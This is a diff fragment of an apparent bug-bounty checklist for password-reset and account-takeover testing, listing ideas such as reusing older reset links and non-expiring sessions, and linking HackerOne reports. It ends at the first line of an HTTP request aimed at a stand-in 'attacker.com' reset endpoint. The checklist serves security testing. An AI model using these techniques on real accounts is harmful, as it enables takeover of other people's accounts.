@@ -19,8 +19,7 @@ https://medium.com/@deadoverflow/account-takeover-vulnerability-that-resulted-in
 7. Session/Token is not expiring after password reset.
 8. Weak Password Policy - Add only space in password.
 9. Request for 2 password reset links and try the older one.
-9.1. [RTLO](https://hackerone.com/reports/563268)
-9.2. [BYPASS](https://hackerone.com/reports/271324)
+10. [RTLO](https://hackerone.com/reports/563268), [BYPASS](https://hackerone.com/reports/271324)
 11. Try:
 ```
 POST https://attacker.com/resetpassword.php HTTP/1.1
